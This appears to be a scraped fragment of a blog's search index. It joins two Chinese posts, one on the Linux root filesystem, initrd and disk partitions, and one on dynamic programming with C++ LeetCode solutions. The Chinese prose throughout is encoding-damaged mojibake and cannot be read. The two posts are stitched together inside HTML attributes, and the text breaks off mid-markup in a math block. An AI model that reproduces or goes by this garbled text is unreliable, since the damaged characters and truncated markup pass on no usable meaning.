&lt;p&gt;æ ¹æ–‡ä»¶ç³»ç»Ÿæ˜¯å†…æ ¸å¯åŠ¨æ—¶æ‰€mountçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå†…æ ¸ä»£ç æ˜ åƒæ–‡ä»¶ä¿å­˜åœ¨æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­(/boot)ï¼Œåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­åœ¨æ ¹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½å®ŒæˆåæŠŠä¸€äº›åŸºæœ¬çš„åˆå§‹åŒ–è„šæœ¬å’ŒæœåŠ¡åŠ è½½åˆ°å†…å­˜ä¸­è¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¹³å¸¸æ‰€ç†è§£çš„æ–‡ä»¶ç³»ç»Ÿä¸€èˆ¬æ˜¯æŒ‡ç£ç›˜æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨linuxä¸­ç£ç›˜æ–‡ä»¶ä¸€èˆ¬éœ€è¦æŒ‚è½½åˆ°æ ¹æ–‡ä»¶ç³»ç»Ÿçš„/devä¸‹ã€‚è€Œæ ¹æ–‡ä»¶ç³»ç»Ÿæ˜¯å†…æ ¸å¯åŠ¨ååŠ è½½åˆ°å†…å­˜å½“ä¸­çš„ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ ¹æ–‡ä»¶ç³»ç»Ÿé€šå¸¸æœ‰è¿™å‡ ç§æ–¹å¼æŒ‚è½½ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ–‡ä»¶ç³»ç»Ÿå·²ç»å­˜åœ¨äºç¡¬ç›˜ï¼ˆæˆ–è€…ç±»ä¼¼çš„è®¾å¤‡ï¼‰çš„æŸä¸ªåˆ†åŒºä¸Šäº†ï¼Œkernelæ ¹æ®å¯åŠ¨çš„å‘½ä»¤è¡Œå‚æ•°ï¼ˆrootï¼/dev/xxx)ï¼Œç›´æ¥è¿›è¡Œmountã€‚è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨rootæ–‡ä»¶ç³»ç»Ÿæœ¬èº«è¿˜ä¸å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œkernelå¦‚ä½•æ ¹æ®/dev/xxxæ¥æ‰¾åˆ°å¯¹åº”çš„è®¾å¤‡å‘¢ï¼ŸåŸæ¥kernelé€šè¿‡ç›´æ¥è§£æè®¾å¤‡çš„åç§°æ¥è·å¾—è®¾å¤‡çš„ä¸»ã€ä»è®¾å¤‡å·ï¼Œç„¶åå°±å¯ä»¥è®¿é—®å¯¹åº”çš„è®¾å¤‡é©±åŠ¨äº†ã€‚æ‰€ä»¥åœ¨init/main.cä¸­æœ‰å¾ˆé•¿ä¸€ä¸²çš„root_dev_namesï¼Œé€šè¿‡è¿™ä¸ªè¡¨å°±å¯ä»¥æ ¹æ®è®¾å¤‡åç§°å¾—åˆ°è®¾å¤‡å·ã€‚&lt;/li&gt;
&lt;li&gt;å¯åŠ¨æ—¶ç”¨åˆ°initrdæ¥mountæ ¹æ–‡ä»¶ç³»ç»Ÿã€‚åœ¨å°†å†…æ ¸åŠ è½½åˆ°å†…å­˜ä¸­å‰ï¼Œå°†ä¸€ä¸ªæ¯”è¾ƒå°çš„æ ¹æ–‡ä»¶ç³»ç»Ÿé•œåƒåŠ è½½åˆ°å†…å­˜å½“ä¸­(/boot/initrd)ï¼Œå§‘ä¸”å°†è¿™æ®µå†…å­˜ç§°ä¸ºinitrdç„¶åé€šè¿‡ä¼ é€’å‚æ•°çš„æ–¹å¼å‘Šè¯‰å†…æ ¸initrdçš„èµ·å§‹åœ°å€å’Œå¤§å°(ä¹Ÿå¯ä»¥æŠŠè¿™äº›å‚æ•°ç¼–è¯‘åœ¨å†…æ ¸ä¸­)ï¼Œåœ¨å¯åŠ¨é˜¶æ®µå°±å¯ä»¥æš‚æ—¶çš„ç”¨initrdæ¥mountæ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œinitrdçš„æœ€åˆçš„ç›®çš„æ˜¯ä¸ºäº†æŠŠkernelçš„å¯åŠ¨åˆ†æˆä¸¤ä¸ªé˜¶æ®µï¼šåœ¨kernelä¸­ä¿ç•™æœ€å°‘æœ€åŸºæœ¬çš„å¯åŠ¨ä»£ç ï¼Œç„¶åæŠŠå¯¹å„ç§å„æ ·ç¡¬ä»¶è®¾å¤‡çš„æ”¯æŒä»¥æ¨¡å—çš„æ–¹å¼æ”¾åœ¨initrdä¸­ï¼Œè¿™æ ·å°±åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­å¯ä»¥ä»initrdæ‰€mountçš„æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­è£…è½½éœ€è¦çš„æ¨¡å—ã€‚è¿™æ ·çš„ä¸€ä¸ªå¥½å¤„å°±æ˜¯åœ¨ä¿æŒkernelä¸å˜çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¿®æ”¹initrdä¸­çš„å†…å®¹å°±å¯ä»¥çµæ´»çš„æ”¯æŒä¸åŒçš„ç¡¬ä»¶ã€‚åœ¨å¯åŠ¨å®Œæˆçš„æœ€åé˜¶æ®µï¼Œæ ¹æ–‡ä»¶ç³»ç»Ÿå¯ä»¥é‡æ–°mountåˆ°å…¶ä»–è®¾å¤‡ä¸Šï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ä¸å†é‡æ–°mount(å¾ˆå¤šåµŒå…¥å¼ç³»ç»Ÿå°±æ˜¯è¿™æ ·)ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;linuxæ“ä½œç³»ç»Ÿçš„ç£ç›˜åˆ†åŒºä¸ç›®å½•ç»“æ„&#34;&gt;linuxæ“ä½œç³»ç»Ÿçš„ç£ç›˜åˆ†åŒºä¸ç›®å½•ç»“æ„&lt;/h2&gt;
&lt;p&gt;æ–‡ä»¶ç³»ç»Ÿä»¥ç£ç›˜ä¸ºåŸºç¡€å­˜å‚¨æ–‡ä»¶ï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªé€»è¾‘æ¦‚å¿µï¼Œç£ç›˜æ˜¯ä¸€ä¸ªç‰©ç†æ¦‚å¿µã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç£ç›˜åˆ†åŒº&#34;&gt;ç£ç›˜åˆ†åŒº&lt;/h3&gt;
&lt;p&gt;ç¡¬ç›˜åˆ†åŒºåŒ…æ‹¬&lt;strong&gt;ä¸»åˆ†åŒº&lt;/strong&gt;ã€&lt;strong&gt;æ‰©å±•åˆ†åŒº&lt;/strong&gt;å’Œ&lt;strong&gt;é€»è¾‘åˆ†åŒº&lt;/strong&gt;ã€‚linuxè§„å®šæ¯ä¸ªç¡¬ç›˜è®¾å¤‡æœ€å¤šèƒ½æœ‰4ä¸ªä¸»åˆ†åŒº(å…¶ä¸­åŒ…å«æ‰©å±•åˆ†åŒº)ï¼Œæ¯ä¸ªæ‰©å±•åˆ†åŒºéœ€è¦å ç”¨ä¸€ä¸ªä¸»åˆ†åŒºå·ï¼Œå³ä¸»åˆ†åŒºå’Œæ‰©å±•åˆ†åŒºæ€»å…±ä¸è¶…è¿‡4ä¸ªï¼Œé€»è¾‘åˆ†åŒºçš„æ•°é‡ä¸é™ã€‚&lt;/p&gt;
&lt;p&gt;linuxä¸­æ¯ä¸ªè®¾å¤‡éƒ½èƒ½æ˜ å°„åˆ°ä¸€ä¸ªç³»ç»Ÿçš„æ–‡ä»¶ï¼Œå¯¹äºç¡¬ç›˜ï¼Œé©±åŠ¨æ ‡è¯†ç¬¦ä¸º&lt;code&gt;sdx*&lt;/code&gt;ï¼Œ&lt;code&gt;sd&lt;/code&gt;è¡¨æ˜è®¾å¤‡ç±»å‹ï¼Œ&lt;code&gt;x&lt;/code&gt;ä¸ºç›˜å¥½(aæ˜¯åŸºæœ¬ç›˜ï¼Œbæ˜¯åŸºæœ¬ä»å±ç›˜ï¼Œcæ˜¯è¾…åŠ©ä¸»ç›˜ï¼Œdæ˜¯è¾…åŠ©ä»å±ç›˜)ï¼›&lt;code&gt;*&lt;/code&gt;ä»£è¡¨åˆ†åŒºï¼Œå‰4ä¸ªåˆ†åŒºç”¨æ•°å­—1~4è¡¨ç¤ºï¼Œè¡¨ç¤ºä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒºã€‚ä¾‹å¦‚&lt;code&gt;sda2&lt;/code&gt;è¡¨ç¤ºç¬¬1ä¸ªç¡¬ç›˜ä¸Šçš„ç¬¬2ä¸ªä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒºã€‚&lt;/p&gt;
&lt;p&gt;æ¯ä¸€ä¸ªåˆ†åŒºéƒ½æ˜¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œéƒ½æœ‰è‡ªå·±çš„ç›®å½•å±‚æ¬¡ç»“æ„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;linuxå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿ&#34;&gt;linuxå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ext2æ–‡ä»¶ç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;ext3æ–‡ä»¶ç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;Swapæ–‡ä»¶ç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;VFAT&lt;/li&gt;
&lt;li&gt;NFS&lt;/li&gt;
&lt;li&gt;XFS&lt;/li&gt;
&lt;li&gt;IOS 9660&lt;/li&gt;
&lt;li&gt;proc&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;linuxç›®å½•ç»“æ„&#34;&gt;linuxç›®å½•ç»“æ„&lt;/h3&gt;
&lt;h2 id=&#34;å¸¸ç”¨çš„ç£ç›˜æ“ä½œå‘½ä»¤&#34;&gt;å¸¸ç”¨çš„ç£ç›˜æ“ä½œå‘½ä»¤&lt;/h2&gt;
&lt;h2 id=&#34;linuxæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½æ“ä½œ&#34;&gt;linuxæ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½æ“ä½œ&lt;/h2&gt;
&lt;h2 id=&#34;å¸¸ç”¨çš„æ–‡ä»¶æ“ä½œ&#34;&gt;å¸¸ç”¨çš„æ–‡ä»¶æ“ä½œ&lt;/h2&gt;
&lt;p&gt;https://www.cnblogs.com/zongzi10010/p/10023700.html&lt;/p&gt;
">ã€linuxã€‘æ–‡ä»¶ç³»ç»Ÿä¸æ“ä½œ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/dong-tai-gui-hua-xian-xing-dp/"" data-c="
          &lt;p&gt;å¦‚æœæŸä¸€é—®é¢˜æœ‰å¾ˆå¤šé‡å å­é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;åŠ¨è§„ä¸­æ¯ä¸€ä¸ªçŠ¶æ€ä¸€å®šæ˜¯ç”±ä¸Šä¸€ä¸ªçŠ¶æ€æ¨å¯¼å‡ºæ¥çš„ï¼Œè¿™ä¸€ç‚¹åŒºåˆ«äºè´ªå¿ƒã€‚è´ªå¿ƒæ²¡æœ‰æ¨å¯¼çŠ¶æ€ï¼Œè€Œæ˜¯ä»å±€éƒ¨ç›´æ¥é€‰å–æœ€ä¼˜çš„ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¡®å®šdpæ•°ç»„ä»¥åŠä¸‹æ ‡çš„å«ä¹‰&lt;/li&gt;
&lt;li&gt;ç¡®å®šé€’æ¨å…¬å¼&lt;/li&gt;
&lt;li&gt;dpæ•°ç»„å¦‚ä½•åˆå§‹åŒ–&lt;/li&gt;
&lt;li&gt;ç¡®å®šéå†é¡ºåº&lt;/li&gt;
&lt;li&gt;ä¸¾ä¾‹æ¨å¯¼dpæ•°ç»„&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;ç®€å•åŠ¨è§„é¢˜&#34;&gt;ç®€å•åŠ¨è§„é¢˜&lt;/h1&gt;
&lt;h2 id=&#34;æ–æ³¢é‚£å¥‘æ•°åˆ—&#34;&gt;æ–æ³¢é‚£å¥‘æ•°åˆ—&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/fibonacci-number/&lt;/p&gt;
&lt;h2 id=&#34;çˆ¬æ¥¼æ¢¯&#34;&gt;çˆ¬æ¥¼æ¢¯&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/climbing-stairs/&lt;/p&gt;
&lt;h2 id=&#34;æœ€å°èŠ±è´¹çˆ¬æ¥¼æ¢¯&#34;&gt;æœ€å°èŠ±è´¹çˆ¬æ¥¼æ¢¯&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/min-cost-climbing-stairs/submissions/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int minCostClimbingStairs(vector&amp;lt;int&amp;gt;&amp;amp; cost) {
        int dp[1005];
        dp[0] = 0;
        dp[1] = 0;
        for (int i = 2; i &amp;lt;= cost.size(); i ++ ) {
            dp[i] = min(dp[i - 1] + cost[i - 1], dp[i - 2] + cost[i - 2]);
        }
        return dp[cost.size()];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ä¸åŒè·¯å¾„&#34;&gt;ä¸åŒè·¯å¾„&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/unique-paths/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int uniquePaths(int m, int n) {
        int dp[101][101];
        for (int i = 0; i &amp;lt;= m; i ++) {
            dp[0][i] = 0;
            dp[i][0] = 0;
        }
        for (int i = 1; i &amp;lt;= m; i ++) {
            for (int j = 1; j &amp;lt;= n; j ++) {
                if (i == 1 &amp;amp;&amp;amp; j == 1) 
                    dp[i][j] = 1;
                else
                    dp[i][j] = dp[i-1][j] + dp[i][j-1];
            }
        }
        return dp[m][n];

    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ä¸åŒè·¯å¾„2&#34;&gt;ä¸åŒè·¯å¾„2&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/unique-paths-ii/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int uniquePathsWithObstacles(vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt;&amp;amp; obstacleGrid) {
        if (obstacleGrid[0][0] == 1) return 0;
        int m = obstacleGrid.size();
        int n = obstacleGrid[0].size();
        int dp[101][101];
        for (int i = 0; i &amp;lt;= m; i ++) {
            dp[0][i] = 0;
            dp[i][0] = 0;
        }
        for (int i = 0; i &amp;lt; m; i ++) {
            for (int j = 0; j &amp;lt; n; j ++) {
                if (i == 0 &amp;amp;&amp;amp; j == 0) 
                    dp[i + 1][j + 1] = 1;
                else if (obstacleGrid[i][j] == 1) 
                    dp[i + 1][j + 1] = 0;
                else if (i == 0 || obstacleGrid[i - 1][j] == 1)
                    dp[i + 1][j + 1] = dp[i + 1][j];
                else if (j == 0 || obstacleGrid[i][j - 1] == 1)
                    dp[i + 1][j + 1] = dp[i][j + 1];
                else
                    dp[i + 1][j + 1] = dp[i][j + 1] + dp[i + 1][j];
            }
        }
        return dp[m][n];
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ•´æ•°æ‹†åˆ†&#34;&gt;æ•´æ•°æ‹†åˆ†â€»&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/integer-break/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int integerBreak(int n) {
        int dp[60]; // dp[i] è¡¨ç¤ºiæ‹†åˆ†åä¹˜ç§¯çš„æœ€å¤§å€¼
        memset(dp, 0, sizeof(dp));
        dp[2] = 1;
        for (int i = 3; i &amp;lt;= n; i ++) {
            for (int j = 1; j &amp;lt; i - 1; j ++) {
                dp[i] = max(dp[i], max((i - j) * j, dp[i - j] * j));
                // å¯¹äºiï¼Œå°†å…¶æ‹†åˆ†ä¸¤ä¸ªæ•°-&amp;gt; j, (i-j)
                // æ‹†åˆ†æˆå¤šä¸ªæ•°-&amp;gt; j, dp[i-j]
                // æœ€å¤§å€¼å¯èƒ½æ˜¯æ‹†åˆ†æˆä¸¤ä¸ªæ•°ï¼Œä¹Ÿå¯èƒ½æ‹†åˆ†æˆå¤šä¸ªæ•°ï¼Œä¾‹å¦‚3ï¼Œå¯ä»¥æ‹†åˆ†æˆ1ï¼Œ2ï¼Œä¹Ÿå¯ä»¥æ˜¯1ï¼Œ1ï¼Œ1ï¼Œæ˜¾ç„¶1ï¼Œ2çš„ä¹˜ç§¯æœ€å¤§ã€‚
            }
        }
        return dp[n];
    }
};

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ä¸åŒçš„äºŒå‰æœç´¢æ ‘&#34;&gt;ä¸åŒçš„äºŒå‰æœç´¢æ ‘â€»&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/unique-binary-search-trees/submissions/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜æœ‰äº›éš¾åº¦ï¼Œéœ€è¦æ€»ç»“æ¨ç†ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://camo.githubusercontent.com/bf3fdc435d1771942205a97a1f754dc39498dc2cce5886a429b2f113028e70b4/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303231303130373039333132393838392e706e67&#34; alt=&#34;96.ä¸åŒçš„äºŒå‰æœç´¢æ ‘1&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å½“n=3æ—¶ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å½“1ä½œä¸ºæ ¹ï¼Œé‚£ä¹ˆå…¶å³å­æ ‘çš„ç§ç±»å’Œn=2æ—¶çš„æƒ…å†µä¸€æ ·ï¼›&lt;/li&gt;
&lt;li&gt;å½“2ä½œä¸ºæ ¹ï¼Œé‚£ä¹ˆå…¶å·¦å³å­æ ‘çš„ç§ç±»å’Œn=1æ—¶çš„æƒ…å†µä¸€æ ·ï¼›&lt;/li&gt;
&lt;li&gt;å½“3ä½œä¸ºæ ¹ï¼Œé‚£ä¹ˆå…¶å·¦å­æ ‘çš„ç§ç±»å’Œn=1æ—¶çš„æƒ…å†µä¸€æ ·ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ‰€ä»¥å½“n=mæ—¶ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å°†1ä½œä¸ºæ ¹ï¼Œé‚£ä¹ˆå…¶å³å­æ ‘çš„ç§ç±»å’Œn=m-1æ—¶çš„æƒ…å†µä¸€æ ·ï¼›&lt;/li&gt;
&lt;li&gt;å°†2ä½œä¸ºæ ¹ï¼Œé‚£ä¹ˆå…¶å·¦å­æ ‘çš„ç§ç±»å’Œn=1æ—¶çš„ä¸€æ ·ï¼Œå³å­æ ‘çš„ç§ç±»å’Œn=m-2æ—¶çš„ä¸€æ ·ï¼Œå·¦å³å­æ ‘æƒ…å†µç›¸ä¹˜ï¼›&lt;/li&gt;
&lt;li&gt;å°†3ä½œä¸ºæ ¹ï¼Œé‚£ä¹ˆå…¶å·¦å­æ ‘çš„ç§ç±»å’Œn=2æ—¶çš„ä¸€æ ·ï¼Œå³å­æ ‘çš„ç§ç±»å’Œn=m-3æ—¶çš„ä¸€æ ·ï¼Œå·¦å³å­æ ‘æƒ…å†µç›¸ä¹˜ï¼›&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;li&gt;å°†mä½œä¸ºæ ¹ï¼Œé‚£ä¹ˆå…¶å·¦å­æ ‘çš„ç§ç±»å’Œn=m-1æ—¶çš„æƒ…å†µä¸€æ ·ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¯ä»¥æ¨å‡ºé€’æ¨å…¬å¼ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;dp[n] = dp[n-1]*dp[0] + dp[n-2]*dp[1] + dp[n-3]*dp[2] + ... +dp[0]*dp[n-1]
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; 